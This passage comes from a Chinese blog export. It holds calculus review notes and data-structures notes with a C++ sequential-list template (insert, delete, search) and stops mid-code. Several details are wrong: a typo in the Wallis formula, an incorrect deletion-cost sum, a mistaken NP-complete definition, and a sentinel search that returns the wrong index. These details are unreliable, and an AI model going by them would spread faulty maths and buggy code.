\int_0^\pi
f(sinx)dx=2\int^{\frac{\pi}{2}}_{0}f(sinx)dx(f(sinx)关于x=\frac{\pi}{2}对称)
\]</span></p>
<p>华里氏(点火公式)： <span class="math display">\[
\int^{\frac{\pi}{2}}_{0}\sin^nxdx=\int^{\frac{\pi}{2}}_0\cos^n
xdx=\cases{\frac{(n-1)!!}{n!!},当n为奇数\\\frac{(n-1!!)}{n!!}\cdot
\frac{\pi}{2}，当n为偶数}
\]</span> 例如： <span class="math display">\[
\int_0^{\frac{pi}{2}}sin^9xdx=\frac{8}{9}\cdot\frac{6}{7}\cdot\frac{4}{5}\cdot\frac{2}{3}
\]</span></p>
<h3 id="再按不定积分思路">再按不定积分思路</h3></li>
<li><p>有根号则用换元公式去根号</p></li>
<li><p>无根式则凑微分</p></li>
</ol>
<h2 id="数列极限化积分">数列极限化积分</h2>
<p>​ 找变化项，凑配变化得到形如： <span class="math display">\[
\sum_{i=1}^n f(\frac{i}{n})\frac{1}{n}
\]</span> ​ 的式子，再将其变化为(0,1)上的定积分</p>
<h2 id="反常积分审敛法">反常积分审敛法</h2>
<p><span class="math display">\[
\int _a ^{+\infty}\frac{dx}{x^p\ln ^qx}(a&gt;1).
\]</span></p>
<ol type="1">
<li>当p&gt;1时，收敛</li>
<li>当p=1时，若q&gt;1则收敛</li>
<li>当p=1时，若q&lt;=1则发散</li>
<li>当p&lt;1时发散</li>
</ol>
<h2 id="判准">判准</h2>
<p>​ 要判断无穷限积分<span
class="math inline">\(\int_a^{+\infty}f(x)dx\)</span>的敛散性，需要找<span
class="math inline">\(x\to
\infty\)</span>时被积函数f(x)的等价或同阶无穷小<span
class="math inline">\(\frac{1}{x^p}\)</span>，而<span
class="math inline">\(\int_a^{+\infty}f(x)dx\)</span>和<span
class="math inline">\(\int_a^{+\infty}\frac{1}{x^p}\)</span>同敛散</p>
<p>​ 要判断瑕积分<span
class="math inline">\(\int_a^bf(x)dx\)</span>的敛散性，需要瑕点附近f(x)的等价无穷大，由由于无穷大的倒数是无穷小，所以找等价无穷小即可。</p>
]]></content>
      <categories>
        <category>Review</category>
      </categories>
      <tags>
        <tag>Review</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构</title>
    <url>/archives/79666db.html</url>
    <content><![CDATA[<h1 id="绪论">绪论</h1>
<p>​ 数据表示的本质是数据结构设计，数据处理的本质是算法设计。</p>
<p>​ 算法+数据结构=程序 ——Niklaus Wirth</p>
<ul>
<li>数值计算问题：如概率统计，求极限等，用数学建模、公式推导来解决</li>
<li>非数值计算问题：对弈问题等，用数据结构和算法来解决</li>
</ul>
<p>​ 数据结构解决数据如何存储的问题，算法解决如何操作数据的问题。
<span id="more"></span></p>
<h2 id="数据结构的基本概念">数据结构的基本概念</h2>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230219112538584.png" /></p>
<p>​ 数据元素是数据的基本单位。</p>
<p>​
数据项是构成数据元素的不可分割的最小单位，每个数据元素可以包含多个不同的数据项，每个数据项具有独立的含义。</p>
<p>​
数据类型是具有相同性质的数据的集合以及在这个数据集合上的一组操作。</p>
<p>​ 数据类型分为简单类型（原子类型）和构造类型（结构类型）。</p>
<p>​
数据结构是指按照某种逻辑关系组织起来的一组数据，按照一定的存储方法存储在存储器中，并在这些数据上定义一组运算的集合。通常认为数据结构包含以下3方面的内容。</p>
<ul>
<li>数据元素之间的逻辑关系，称为数据的逻辑结构。</li>
<li>数据元素及其关系在计算机存储器内的存储形式，称为数据的存储类型，物理结构。</li>
<li>对数据的操作或运算。</li>
</ul>
<p>​
逻辑结构描述了数据相互间的关联形式或邻接形式，反映了数据内部的构成方式，定义了数据的本质特点，因此人们常常将数据的逻辑结构称为数据结构。</p>
<p>​ 常见的逻辑结构共有4种：</p>
<ul>
<li>集合，共同属于一个集合的关系，通常要求集合中的元素不可重复；</li>
<li>线性结构，其数据元素之间的逻辑特点是有且仅有一个起始结点和一个终端结点，并且其他结点的前面有且只有一个结点（称为直接前驱），每个结点的后面有且只有一个结点（称为直接后继）。</li>
<li>树结构，其数据元素之间存在着一对多的层次关系。</li>
<li>图结构，数据元素之间存在多对多的关系。</li>
</ul>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230219112601216.png" /></p>
<p>​
数据的存储结构考虑的是如何在计算机的存储器中存储各个数据元素，并同时反映数据元素间的逻辑关系。基本的存储结构通常有两大类：</p>
<ul>
<li><p>顺序存储结构：用一组连续的存储单元一次存储各个数据元素，数据元素之间的逻辑关系由存储单位的邻接关系体现。顺序存储通常借助于数组来体现。</p></li>
<li><p>链式存储结构：即用一组任意的存储单位来存储各个数据元素，数据元素之间的关系通常用指针来表示，例如后一个元素的地址存储在前一个元素的某个特定数据项中。</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230219112620335.png" /></p></li>
</ul>
<p>​
学习一种数据结构，首先分析其逻辑结构及其相关操作，掌握了各种数据结构的逻辑特点，当分析待处理数据时可以根据数据特点来确定数据结构类型。分析了逻辑结构后，再学习其各种常见存储方式。</p>
<h2 id="算法与算法分析">算法与算法分析</h2>
<p>​ 数据的运算是通过算法描述的。</p>
<h3 id="算法描述">算法描述</h3>
<p>​ 每个算法必须满足以下5个准则：</p>
<ul>
<li>输入：具有0或多个输入参数</li>
<li>输出</li>
<li>有穷性：每条指令的执行次数必须是有限的，即执行了有穷步后能结束</li>
<li>确定性：每条指令必须有确切的含义，无二义性</li>
<li>可行性：每条指令的执行时间都是有限的</li>
</ul>
<p>​
在用面向对象的思想设计算法时，往往将算法看作某个类的某种运算方法，例如每个自然数都可以与其他自然数求解两者的最大公约数，因此这个求解运算可认为是自然数类的一种操作方法。</p>
<h2 id="算法分析">算法分析</h2>
<h3 id="时间复杂度">时间复杂度</h3>
<p>​
将问题规模设为n，作为参数进行分析，运行算法的时间T可看成问题规模n的函数，记为T(n)</p>
<p>​
假定每条语句执行一次所需是时间是单位时间，则每条语句执行的时间正比于该语句执行的次数。</p>
<p>​
通常将语句执行的次数称为该语句的频度，算法运行的时间可认为是算法中所有语句的频度之和。</p>
<p>​ 时间复杂度O：如果存在两个正常数c和n<sub>0</sub>，对于任意<span
class="math inline">\(n\geq n_0\)</span>，都有<span
class="math inline">\(T(n)\leq c\times
f(n)\)</span>，则称T(n)=O(f(n))</p>
<p>​
一般来说，只要算法的执行时间不随着问题规模n的增加而增长，即使算法中有上千条语句，其执行时间也只是一个常数，此时算法的复杂度为O(1)</p>
<p>​ 常见的时间复杂度有：常数阶O(1)、对数阶O(log
n)、线性阶O(n)、线性对数阶O(nlog
n)等。解决同一问题的不同算法，算法的时间复杂度越低越好。当问题的规模较大时，通常认为具有指数阶的算法是不可以计算的。</p>
<h3 id="空间复杂度">空间复杂度</h3>
<p>​ 算法执行过程中所耗费的存储空间。通常可以以空间换时间。</p>
<h2 id="np问题">NP问题</h2>
<p>​
<strong>P问题</strong>：若存在以<strong>问题规模n为变量</strong>的多<strong>项式函数p(n)</strong>，解决该问题的算法的<strong>时间复杂度为O(p(n))</strong>，则称该问题为多<strong>项式时间问题</strong>，即P问题。其解决算法为多项式时间算法</p>
<p>​
还有另一类算法，其时间复杂度不能用多项式函数去界定，称为指数时间算法，例如O(2<sup>n</sup>),O(n!)等</p>
<p>​ 如果问题规模n较大，显然多项式时间算法优于指数时间算法。</p>
<p>​
对于很多问题，可能不清楚是否存在一个能在多项式时间里解决它的算法，但是可以<strong>在多项式的时间里验证一个解</strong>，这种问题称为<strong>非确定性多项式时间问题</strong>，简称<strong>NP问题</strong>，显然<span
class="math inline">\(P\subseteq NP\)</span></p>
<p>​
例如，大的合数分解质因数，没有同一个公式可以直接得到因子，无法直接计算得到，只能通过间接的猜算得到结果，这就是非确定性问题。</p>
<p>​
这些问题通常有个算法，它不能直接告知答案是什么，但可以告知某个可能的结果是正确的还是错误的，这个可以告知猜算结果正确与否的算法，假如<strong>可以在多项式时间内算出来</strong>，就称为<strong>NP问题</strong>。</p>
<p>​
如果这个问题的<strong>所有可能答案</strong>都是可以在多项式时间内进行正确与否的验算的话，就称为<strong>NP完全问题</strong>，即<strong>NPC问题</strong>。</p>
<p>​
NP问题通俗来说就是其解的正确性能够被“很容易检查”的问题，即存在一个多项式检查算法。若NP中所有问题到某一个问题是图灵可归约的，则该问题为NP-hard问题。</p>
<p>​
NP-hard问题不一定是一个NP问题，但所有的NP问题都可以约化到该问题，例如，售货员旅行问题即TSP，是最具有代表性的NP问题之一。</p>
<h2 id="stl与数据结构">STL与数据结构</h2>
<p>​ STL（Standard Template
Library，标准模板类）是C++语言提供的一个基础模板类型，包含了各种常用的存储数据的模板类及相应的操作函数，为开发者提供了一种快速有效的访问机制。</p>
<p>​
从根本上来说，STL是一些容器、算法合其他一些组件的集合，这些容器有list，vector，set，map等。基本达到了各种存储方法合相关算法的高度优化。STL已经是C++的一部分，不用额外安装。</p>
<p>​
在C++标准中，STL被组织为以下13个头文件：&lt;algorithm&gt;,&lt;deque&gt;,&lt;functional&gt;,&lt;iterator&gt;,&lt;vector&gt;,&lt;list&gt;,&lt;map&gt;,&lt;memory&gt;,&lt;numeric&gt;,&lt;queue&gt;,&lt;set&gt;,&lt;set&gt;,&lt;stack&gt;和&lt;utility&gt;。通常认为STL由空间管理器、迭代器、泛函、适配器、容器和算法6部分构成，其中前面4部分用于服务后面两部分。</p>
<p>​
空间管理器：为容器类模板提供用户自定义的内存申请和释放功能。默认情况下，STL仍然使用C++的内存管理函数或操作符来完成动态内存申请和释放。</p>
<p>​
迭代器：类似于指针，存储某个对象的地址或者说指向某个对象，有时也被称为广义指针。迭代器可以为STL中的算法提供数据的输入，也可以用来遍历容器类或流中的对象。指针本身也可以认为是一个迭代器，用户也可以自定义迭代器。</p>
<p>​
泛函：在STL中，如果某个类重载了函数调用运算符“()”，则称该类为泛函类，称其对象为泛函。通过引入泛函，可以为算法提供某个策略。例如，同一个排序算法，可以利用泛函完成对不同关键字进行升序或降序等各种排列策略。</p>
<p>​
适配器：适配器对象将自己与另外一个对象进行绑定，使对适配器对象的操作转换为被绑定对象的操作。STL中适配器应用较广，有容器适配器，如栈(stack)、队列(queue)、优先队列(priority_queue)，以及迭代器适配器和泛函适配器。</p>
<p>​
容器：包含若干对象的数据结构，并提供少量操作接口。STL提供3类标准容器：顺序容器、排序容器和哈希容器，后两类容器有时也统称为关联容器。</p>
<ul>
<li>顺序容器：包括向量(vector)、列表(list)、双端队列(deque)。顺序容器将单一类型元素聚集起来称为容器，然后根据位置来存储和访问这些元素。</li>
<li>排序容器：包括集合(set)、多重集合(multiset)、映射(map)以及多重映射(multimap)。排序容器的元素位置一般通过元素键值的大小关系来确定，可以通过键值高效地查找和读取元素。</li>
<li>哈希容器：包括哈希集合(hash_set)、哈希多重集合(hash_multiset)、哈希映射(hash-map)以及哈希多重映射(hash_multimap)。哈希容器中的元素位置直接通过元素的键值确定，通过键值将会更加高效地查找和读取元素。</li>
</ul>
<p>​
算法可以认为是STL的精髓，所有算法都是采用函数模板的形式提供的。STL提供的算法大致分为4类：日常事务算法、查找类算法、排序类算法、工作类算法。</p>
<h1 id="线性表">线性表</h1>
<p>​
线性表的逻辑结构简单，相邻元素之间只有单一的前驱和后继的关系，便于实现和操作。</p>
<h2 id="定义">定义</h2>
<p>​
线性表简称表，是由具有零个或多个相同类型的数据元素构成的有限序列。元素的个数称为线性表的长度。长度为零的线性表称为空表。对于非空表，通常记为：
<span class="math display">\[
L=(a_1,a_2,\cdots,a_n)
\]</span> ​ 其中，n为线性表的长度，<span class="math inline">\(a_i(1\leq
i \leq
n)\)</span>称为数据元素或结点，i表示该元素在线性表中的位置或序号，称a<sub>i</sub>是线性表的L的第i个数据元素。a<sub>i</sub>称为第一个元素或开始结点，a<sub>n</sub>称为最后一个元素或终端结点。对于中间任意一个元素<span
class="math inline">\(a_i(1&lt; i &lt;
n)\)</span>，称a<sub>i-1</sub>为a<sub>i</sub>的直接前驱，称a<sub>i+1</sub>为a<sub>i</sub>的直接后继。线性表的实例如图</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230220091308711.png" /></p>
<p>对于非空的线性表L，具有如下性质：</p>
<ul>
<li>有且仅有一个开始结点a<sub>1</sub>，a<sub>1</sub>没有直接前驱，有且仅有一个直接后继a<sub>2</sub>；</li>
<li>有且仅有一个终端结点a<sub>n</sub>，a<sub>n</sub>没有直接后继，有且仅有一个直接前驱a<sub>n-1</sub>；</li>
<li>其余的任意内部结点a<sub>i</sub>(1&lt;i&lt;n)有且仅有一个直接前驱结点a<sub>i-1</sub>，有且仅有一个直接后继结点a<sub>i+1</sub>；</li>
</ul>
<p>​
对于一个含有相同类型元素的有限数据集合，如果满足上述性质，则认为该数据集合是线性表结构。例如一周的7天，英文字母表。</p>
<h2 id="线性表的运算">线性表的运算</h2>
<p>​
线性表的运算是指对线性表的基本操作，这里所说的运算是在逻辑结构上的定义，只是确定这些功能是什么，而不去考虑其具体实现。</p>
<ol type="1">
<li>求长度GetLength(L)，求线性表L的长度；</li>
<li>置空表SetNull(L)，将线性表置成空表；</li>
<li>按位置找Get(L,i)，查找线性表的第i个元素，i应满足<span
class="math inline">\(1\leq i\leq GetLength(L)\)</span>；</li>
<li>修改Set(L,i,x)，修改线性表中第i个元素的值为x；</li>
<li>删除Delete(L,I)，删除线性表L中的第i个元素；</li>
<li>插入Insert(L,i,x)，在线性表L的第i个位置插入一个值为x的新元素；</li>
<li>按值查找Locate(L,x)，查找线性表L中值为x的元素；</li>
<li>排序sort(L)，按某种要求重新将线性表L中各元素进行排列；</li>
</ol>
<h2 id="各种常用的存储结构">各种常用的存储结构</h2>
<h3 id="顺序表">顺序表</h3>
<p>​
把线性表中的数据元素按逻辑次序一次存放在一组地址连续的存储空间。通常认为线性表中的所有数据元素具有相同的数据类型，占用相同的存储空间。</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230220095225767.png" /></p>
<p>​
假定顺序表长度为n，每个元素占用c个存储单位，其中第一个存储单元的地址就是该元素的存储地址，第i个数据元素a<sub>i</sub>的地址记为LOC(a<sub>i</sub>)，则有如下计算公式：
<span class="math display">\[
LOC(a_i)=LOC(a_1)+(i-1)\times c\space \space 1\leq i \leq n
\]</span> ​
也就是说，顺序表中的每个元素的存储地址是该元素在表位置的线性函数，只要知道第一个元素的存储地址以及每个元素占用的存储空间，就可以直接计算得到任意元素的存储地址。</p>
<p>​ 因此顺序表是一种<strong>随机存储结构</strong>。</p>
<p>​ 显然，在C++中，可以用数组来顺序存储顺序表中的所有元素。</p>
<h4 id="顺序表的优点">顺序表的优点</h4>
<ol type="1">
<li>不需要为表示元素之间的逻辑关系而增加额外的存储空间；</li>
<li>可以方便的随机访问顺序表中的任一位置的元素；</li>
</ol>
<h4 id="顺序表的缺点">顺序表的缺点</h4>
<ol type="1">
<li>插入和删除操作需移动大量的数据元素，效率较低。在等概率条件下，两种操作平均需要移动顺序表中约一半的元素；</li>
<li>顺序表难以选择合适的存储容量。</li>
</ol>
<h2 id="链式存储结构">链式存储结构</h2>
<p>​
链表用一组任意的存储单元存放线性表中的各个元素，这组存储单元可以是连续的，也可以是分散的。因此，链表中数据元素的逻辑次序和物理次序不一定相同。为了正确地表示结点的逻辑关系，在存储每个元素值的同时，还要存储该元素的直接后继元素的位置信息，这个信息称为指针(pointer)或链(link)，这个两部分信息构成了实际的存储结构，称为结点(node)，然后各个结点通过指针链接起来形成一个完整的链式结构，称为链表，示例如下图：</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230220101549397.png" /></p>
<p>​
通常人们关心的是单链表中各个结点的逻辑次序，而不关心其实际存储的位置。</p>
<p>​
指向第一个结点的指针，我们称为头指针；指向最后一个结点的指针，由于其没有后继结点，我们设置为NULL</p>
<p>​
根据链表结构或者节点结构的不同，可以把链表分为：单链表，循环链表和双链表三种。。</p>
<h3 id="单链表">单链表</h3>
<p>​
链表中的每个结点只包含一个指向直接后继的指针即为单链表。若链表为空，则头指针为NULL，若链表不为空，头指针存储第一个结点的地址。有时，单链表的第一个结点不存放数据，仅作为表头使用，则称其为带头节点的单链表；否则称其为不带头结点的单链表</p>
<figure>
<img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230220105020876.png"
alt="、" />
<figcaption aria-hidden="true">、</figcaption>
</figure>
<h3 id="循环链表">循环链表</h3>
<p>​
如果将单链表的最后一个结点的指针指向头节点，则整个链表构成一个环，这种首尾相接的单链表被称为单循环链表。</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230220105345203.png" /></p>
<p>​
这种循环链表查找第一个元素很方便，但查找最后一个元素很慢，因此常常使用尾指针rear来表示单循环链表，如下图所示，即设指针rear指向单循环链表的最后一个结点，这样就可以很方便地访问首尾两端的元素了。</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230220105610048.png" /></p>
<h3 id="双链表">双链表</h3>
<p>​
对于单链表，由于前一个结点已经存储了直接后继结点的地址，因此可以直接得到直接后继结点。而如果查找当前结点的直接前驱结点，则需要从第一个元素开始遍历，操作比较繁琐，为此，可以在每个结点中再加入一个指针域，用于存储前一个元素的地址，这样便可以方便地得到直接前驱元素，这种链表中有两条方向相反的链，因此称为双向链表，简称双链表。</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230220110112768.png" /></p>
<h2 id="顺序表的实现">顺序表的实现</h2>
<h3 id="顺序表的存储结构">顺序表的存储结构</h3>
<p>​
由于顺序表中的数据元素可以是任意类型，因此在定义顺序表时可采用C++模板的机制。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>,<span class="type">int</span> N&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SeqList</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    	<span class="built_in">SeqList</span>()&#123;length=<span class="number">0</span>;&#125;</span><br><span class="line">    	<span class="built_in">SeqList</span>(T a[],<span class="type">int</span> n);</span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">GetLength</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> length;&#125;</span><br><span class="line">    	<span class="function"><span class="type">void</span> <span class="title">PrintList</span><span class="params">()</span></span>;</span><br><span class="line">    	<span class="function"><span class="type">void</span> <span class="title">Insert</span><span class="params">(<span class="type">int</span> i,T x)</span></span>;</span><br><span class="line">    	<span class="function">T <span class="title">Delete</span><span class="params">(<span class="type">int</span> i)</span></span>;</span><br><span class="line">    	<span class="function">T <span class="title">Get</span><span class="params">(<span class="type">int</span> i)</span></span>;</span><br><span class="line">    	<span class="function"><span class="type">int</span> <span class="title">Locate</span><span class="params">(T x)</span></span>;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">    	T data[N];</span><br><span class="line">    	<span class="type">int</span> length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​
该类含有两个私有变量，数组data存储顺序表的所有数据元素，length表示顺序表当前的长度。</p>
<h3 id="顺序表的基本运算">顺序表的基本运算</h3>
<p>#### 构造函数</p>
<p>​
模板类中含有两个构造函数，无参构造用于建立空顺序表，有参构造函数SeqList(T
a[],int
n)创建一个长度为n的顺序表，其数据元素依次来自参数数组a的各个元素，其长度为传入的参数n。如果n超出了顺序表的最大长度，则应该抛出异常，终止操作。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>,<span class="type">int</span> N&gt;</span><br><span class="line">SeqList&lt;T,N&gt;::<span class="built_in">SeqList</span>(T a[],<span class="type">int</span> n)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(n&gt;N)<span class="keyword">throw</span><span class="string">&quot;数组超出顺序表的最大长度&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        data[i]=a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    length=n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="遍历顺序表">遍历顺序表</h4>
<p>​
遍历顺序表是指按序号依次访问顺序表中的各个数据元素。为简单起见，“访问”在这里表示为将元素的值显示。需要注意的是，由于数据类型不确定，显示操作可能有多种不同处理方式。</p>
<p>​ 简单数据类型的遍历操作如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>,<span class="type">int</span> N&gt;</span><br><span class="line"><span class="type">void</span> SeqList&lt;T,N&gt;::<span class="built_in">PrintList</span>()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;length;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		cout&lt;&lt;data[i]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cout&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​ 若元素为构造类型，则需要使用对应的显示函数。</p>
<h4 id="插入操作">插入操作</h4>
<p>​
在顺序表的第i个位置上插入值为x的新元素。若在表尾追加，则不涉及表中已有元素的移动；若在表头或中间某个位置i插入，则顺序表中原来序号从i到n的元素都要后移一个位置，最终顺序表的长度由n变为n+1。</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230220112600377.png" /></p>
<p>​
需要注意的是，数据元素在后移时，必须从最后一个元素开始移动，即先移动a<sub>n</sub>到n+1的位置，再移动a<sub>n-1</sub>到n位置，依次类推，知道将a<sub>i</sub>移动到i+1的位置。对于一些操作不成功的情况，需要抛出异常</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>,<span class="type">int</span> N&gt;</span><br><span class="line"><span class="type">void</span> SeqList&lt;T,N&gt;::<span class="built_in">Insert</span>(<span class="type">int</span> i,T x)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(length&gt;=N)<span class="keyword">throw</span><span class="string">&quot;上溢异常&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;<span class="number">1</span>||i&gt;length+<span class="number">1</span>)<span class="keyword">throw</span><span class="string">&quot;位置异常&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=length;j&gt;=i;j--)</span><br><span class="line">        data[j]=data[j<span class="number">-1</span>];</span><br><span class="line">    data[i<span class="number">-1</span>]=x;</span><br><span class="line">    length++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​
下面对算法的时间复杂度进行分析，该算法的问题规模是顺序表的长度n，基本语句是for循环中元素后移的语句。</p>
<p>​
当插入的位置在表尾，即i=n+1时，不执行元素后移操作，这是最好的情况，时间复杂度为O(1)；</p>
<p>​
当插入的位置在表头，即i=1时，所有元素都要后移，这是最坏的情况，时间复杂度为O(n)；</p>
<p>​
当插入的位置在表的中间某一位置时，则要分析算法的平均时间复杂度。设T(n)表示元素移动过的平均次数，插入位置为i<span
class="math inline">\((1\leq i\leq
n+1)\)</span>，元素的移动次数为n-i+1，因此有 <span
class="math display">\[
T(n)=\sum_{i=1}^{n+1}p_i(n-i+1)
\]</span> ​
其中，pi表示在表中第i个位置插入新元素的概率，假定在任意位置进行插入操作的概率都相同，则对于任意的i，有：
<span class="math display">\[
p=\frac{1}{n+1}
\]</span> ​ 因此， <span class="math display">\[
T(n)=\sum^{n+1}_{i=1}p_i(n-i+1)=\frac{1}{n+1}\sum_{i=1}^{n+1}(n-i+1)=\frac{n}{2}=O(n)
\]</span> ​
也就是说，对顺序表进行插入操作，在等概率的情况下，平均要移动表中一半的元素，算法的平均复杂度为O(n)。</p>
<h4 id="删除操作">删除操作</h4>
<p>​
把第i个位置的元素删除并返回删除的元素。若要删除表头或中间某个位置i上的元素，则顺序表中原来序号从i+1到n的元素都要向前移动一个位置。</p>
<p>​
与插入操作相反，数据元素在位移时，必须从第n+1个元素开始移动，即先移动a<sub>i+1</sub>到i位置，再移动a<sub>i+2</sub>到i+1的位置，以此类推，对于操作不成功的的特殊情况需要抛出异常或返回错误号。例如，如果在删除操作之前顺序表已经为空表，则抛出下溢异常；如果删除的位置不合理，则抛出位置异常。</p>
<p>​ 伪代码描述：</p>
<blockquote>
<p>[1]如果表空，则抛出下溢异常；</p>
<p>[2]如果删除位置不合理，则抛出位置异常；</p>
<p>[3]取出将被删除的元素；</p>
<p>[4]依次从第i+1个元素开始到第n个元素分别前移1个位置；</p>
<p>[5]表长减1，并返回被删除元素的值。</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>,<span class="type">int</span> N&gt;</span><br><span class="line">T SeqList&lt;T,N&gt;::<span class="built_in">Delete</span>(<span class="type">int</span> i)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">0</span>==length)<span class="keyword">throw</span><span class="string">&quot;下溢错误&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;<span class="number">1</span>||i&gt;length)<span class="keyword">throw</span><span class="string">&quot;位置错误&quot;</span>;</span><br><span class="line">    T x=data[i<span class="number">-1</span>];<span class="comment">//将待删除元素暂存</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=i;j&lt;length;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        data[j<span class="number">-1</span>]=data[j];<span class="comment">//从第i+1个元素开始(下标为i)开始顺序前移，直到最后一个元素</span></span><br><span class="line">    &#125;</span><br><span class="line">    length--;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​ 算法时间复杂度：</p>
<p>​ 类似于插入运算，表头的为O(n)，表尾的为O(1)，中间某个位置时： <span
class="math display">\[
T(n)=\sum _{i=1}^n p_i(n-1)
\]</span> ​
其中p<sub>i</sub>表示删除表中第i个位置上元素的概率。假定在任意位置进行删除操作的概率都相同，则对于任意的i，有
<span class="math display">\[
p_i=\frac{1}{n}
\]</span> ​ 因此 <span class="math display">\[
T(n)=\sum^n_{i=1}p_i(n-1)=\frac{1}{n}\sum^n_{i=1}p_i(n-1)=\frac{n-1}{2}=O(n)
\]</span></p>
<p>​ 也就是说，算法的平均时间复杂度为O(n)</p>
<p>​</p>
<h4 id="查找操作">查找操作</h4>
<h5 id="按位查找">按位查找</h5>
<p>​ 查找顺序表中指定位置的数据元素</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>,<span class="type">int</span> N&gt;</span><br><span class="line">T SeqList&lt;T,N&gt;::<span class="built_in">Get</span>(<span class="type">int</span> i)<span class="comment">//获取线性表第i个位置的元素</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;<span class="number">1</span>||i&gt;length)<span class="keyword">throw</span><span class="string">&quot;查找位置非法&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> data[i<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​ 显然，时间复杂度为O(1)</p>
<h5 id="按值查找">按值查找</h5>
<p>​
查找顺序表中指定数值的数据元素。需要依次比较顺序表中的每个数据元素，直到找到指定数值的数据元素或遍历完整数据表为止。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>,<span class="type">int</span> N&gt;</span><br><span class="line"><span class="type">int</span> SeqList&lt;T,N&gt;::<span class="built_in">Locate</span>(T x)<span class="comment">//查找线性表中值为x的元素，找到后返回其位置</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;length;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(data[i]==x)<span class="keyword">return</span> i+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//查找失败</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​
进行值比较的语句，对于复杂类型，如自定义类，需要在自定义类中对“==”进行运算符重载。</p>
<p>​ 算法的平均时间复杂度为O(n)</p>
<p>​
如果data数组从data[1]开始存储顺序表数据元素，data[0]不存储顺序表数据元素，能否设计更高效的方法</p>
<p>​ 可以采用“<strong>哨兵</strong>”</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>,<span class="type">int</span> N&gt;</span><br><span class="line"><span class="type">int</span> SeqList&lt;T,N&gt;::<span class="built_in">Locate</span>(T x)<span class="comment">//查找线性表中值为x的元素，找到后返回其位置</span></span><br><span class="line">&#123;</span><br><span class="line">    data[<span class="number">0</span>]=x;</span><br><span class="line">    <span class="type">int</span> i=length<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">while</span>(x!=data[i])i--;</span><br><span class="line">    <span class="keyword">return</span> i+<span class="number">1</span>;</span><br><span 